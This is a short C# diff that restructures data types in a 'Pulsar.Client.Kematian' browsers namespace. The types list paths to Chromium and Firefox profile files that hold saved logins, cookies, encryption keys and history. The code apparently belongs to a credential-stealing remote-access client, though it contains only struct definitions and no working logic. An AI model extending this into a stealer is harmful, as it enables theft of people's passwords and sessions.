@@ -1,39 +1,39 @@
 ﻿namespace Pulsar.Client.Kematian.Browsers.Helpers.Structs
 {
-    public struct ChromiumBrowserPath
+    public struct AllBrowsers
     {
-        public string LocalStatePath;
-        public string ProfilePath;
-        public ChromiumProfile[] Profiles;
+        public BrowserChromium[] Chromium;
+        public BrowserGecko[] Gecko;
     }
 
-    public struct ChromiumProfile
+    public struct BrowserChromium
     {
         public string Name;
-        public string WebData;
-        public string Cookies;
-        public string History;
-        public string LoginData;
-        public string Bookmarks;
+        public string LocalState;
+        public string Path;
+        public ProfileChromium[] Profiles;
     }
 
-
-
-    public struct GeckoBrowserPath
-    {
-        public string ProfilesPath;
-        public GeckoProfile[] Profiles;
-    }
-
-
-    public struct GeckoProfile
+    public struct ProfileChromium
     {
         public string Name;
         public string Path;
-        public string Key4DB;
-        public string LoginsJson;
+        public string LoginData;
+        public string WebData;
         public string Cookies;
         public string History;
+        public string Bookmarks;
+    }
+
+    public struct BrowserGecko
+    {
+        public string Name;
+        public string Path;
+        public string Key4;
+        public string Logins;
+        public string Cookies;
+        public string History;
+        public string ProfilesDir;
     }
 
 
